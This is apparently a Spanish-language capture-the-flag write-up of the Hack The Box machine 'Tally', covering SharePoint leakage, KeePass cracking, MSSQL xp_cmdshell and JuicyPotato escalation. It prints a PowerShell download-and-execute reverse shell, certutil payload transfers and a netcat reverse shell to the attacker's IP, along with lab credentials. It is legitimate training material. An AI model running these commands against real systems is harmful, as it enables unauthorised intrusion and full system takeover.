# Tally

**Sistema Operativo**: Windows

**Dificultad**: Hard

**Técnicas Vistas**: SharePoint Enumeration /
Information Leakage /
Playing with mounts (cifs, curlftpfs) /
Abusing Keepass / 
Abusing Microsoft SQL Server (mssqlclient.py - xp_cmdshell RCE) /
Abusing SeImpersonatePrivilege (JuicyPotato)

Te prepara para las **Certificaciones**: OSCP<br><br>

![image](https://github.com/user-attachments/assets/0f6afbbd-5066-4632-abf7-b7d8f61b09e2)<br><br>

Utilizando `nmap` escaneamos todos los puertos<br>

![image](https://github.com/user-attachments/assets/e7099fea-e205-4b21-b638-815f18a72734)

- `-p-` -> Escanea todos los puertos 
- `-sS` -> escaneo de tipo SYN
- `--open` -> Todos los puertos abiertos
- `--min-rate=5000` -> Manda mínimo 5000 paquetes por segundo
- `-Pn` -> Asume que el host especificado está activo
- `-n` -> Que no aplique resolución DNS
- `-oG allports` -> manda todo a un archivo con nombre de "allports"<br><br>

##### Buscamos reportes de pentesting ya realizados<br><br>

Sharepoint pentest report

https://app.pentest-tools.com/sample-reports/sharepoint-scan-sample-report.pdf

Encontramos esta URL:<br><br>

![image](https://github.com/user-attachments/assets/59e2ef00-4100-4e83-8e7a-34d1906a3eff)

Encontramos un documento con credenciales:<br><br>

![image](https://github.com/user-attachments/assets/616a7c51-55b1-4b86-b236-d705b6231364)

Este es el usuario ftp:<br><br>

![image](https://github.com/user-attachments/assets/76ec395e-b492-4d24-ba83-c9f1a42b1b45)

##### Conexión FTP<br><br>

- ftp 10.10.10.59 
- ftp_user
- UTDRSCH53c"$6hys

##### Como investigar un ftp rapido<br><br>

apt install curlftpfs 

apt install tree

https://wiki.archlinux.org/title/CurlFtpFS

` curlftpfs 10.10.10.59 /mnt/ftp/ -o user=ftp_user:'UTDRSCH53c"$6hys'  `

`cd /mnt/ftp`

` tree `


Rompemos el hash keepass que encontramos en la carpeta `Tim`, utilizando `john`<br><br>

![image](https://github.com/user-attachments/assets/519fc4fc-0399-49af-8120-ef18ee5f3623)

`cp /mnt/ftp/User/Tim/Files/tim.kdbx . ` -> Nos traemos el archivo a nuestro directorio actual.
`chmod 444 tim.kdbx` -> darle permisos de lectura.
`keepass2john tim.kdbx` -> Creamos el Hash para romperlo.
`john --wordlist=/usr/share/wordlists/rockyou.txt hash` -> Lo rompemos<br><br>


En el keepass encontramos credenciales:<br>

![image](https://github.com/user-attachments/assets/b302600e-ae18-49dc-b8f2-c3ac9b8bd109)<br><br>


##### Utilizaremos estas credenciales con crackmapexec y smbmap<br><br>

Verificamos que las credenciales sean correctas, listamos los recursos compartidos a nivel de red, y vemos una carpeta ACCT con permisos de lectura. Vemos que contiene.

![image](https://github.com/user-attachments/assets/8e9ddbcf-ff87-4a28-8260-1e0ee53005a4)<br>

umount /mnt/ftp
rm -r /mnt/ftp<br><br>

##### Como "ACCT" tiene muchas carpetas las vamos abrir con monturas:<br>

`mkdir /mnt/smb`
` mount -t cifs //10.10.10.59/ACCT /mnt/smb -o username=Finance,password=Acc0unting,rw ` -> Una montura de tipo "cifs" donde se comparte el recurso a nivel de red, a `/mnt/smb` y proporciono usuario con contraseña, y permisos de lectura y escritura.



Encontramos el binario `/mnt/smb/zz_Migration/Binaries/New folder/tester.exe`, que si lo vemos con `string tester.exe | less`, tenemos credenciales para base de datos.
![image](https://github.com/user-attachments/assets/258b17e3-3933-44a1-8c71-c9859d2a2621)<br><br>


##### Para conectarse a una base de datos Windows puerto 1433 con credenciales

` mssqlclient.py WORKGROUP/sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59 `<br><br>

##### Moverse

` xp_cmdshell "whoami" ` -> Esto aveces esta bloqueado.

`sp_configure "xp_cmdshell", 1 ` -> Podemos intentar habilitarlo. pero nos dice que es una opción avanzada.

`sp_configure "show advanced options", 1` -> Nos dice que tenemos que ejecutar RECONFIGURE

`reconfigure`

`sp_configure "xp_cmdshell", 1` -> Ahora si lo podemos habilitar.

`reconfigure`

` xp cmdshell "whoami" ` -> Ahora si podemos ejecutar comandos.<br><br>

##### Como gano una consola interactiva con "Invoke-PowerShellTcp.ps1"<br><br>

`wget https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 `

SQL -> `xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.20/Invoke-PowerShellTcp.ps1\")"`

Maquina atacante -> `python3 -m http.server 80` -> Comparto el `Invoke-PowerShellTcp.ps1`

Maquina de atacante -> `rlwrap nc -nlvp 443` -> Donde ganamos acceso.<br><br>


# Escalamos privilegios

Vemos `SeImpersonatePrivilege` que es una vulnerabilidad.<br>

![image](https://github.com/user-attachments/assets/f7a6d4a2-5363-4885-95aa-1f94d11da116)<br>

Nos dirigimos a `C:\Windows\Temp\`
`mkdir prive`
`cd prive`<br><br>

##### Nos descargamos este Binario<br><br>

https://github.com/ohpe/juicy-potato/releases/tag/v0.1 

Vemos el Windows que corre con `systeminfo`

Buscamos el CLSID correcto:
https://github.com/ohpe/juicy-potato/tree/master/CLSID <br>

##### Nos descargamos netcat para windows<br><br>

https://eternallybored.org/misc/netcat/  

---

##### ¿Cómo nos transferimos archivos?<br><br>

Maquina windows -> `certutil.exe -f -urlcache -split http://10.10.14.20/JP.exe JP.exe` -> Traemos el binario descargado
Maquina windows -> `certutil.exe -f -urlcache -split http://10.10.14.20/nc.exe nc.exe` -> Traemos el binario descargado

Maquina atacante -> `python3 -m http.server 80` -> Compartimos el binario descargado


Ejecutamos `nc.exe` con el binario `JP.exe`

`.\JP.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\prive\nc.exe -e cmd 10.10.14.20 443" -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" `<br><br>

Flag Final:

![image](https://github.com/user-attachments/assets/ed2c06c7-c36b-45b0-a87a-c20378537caf)
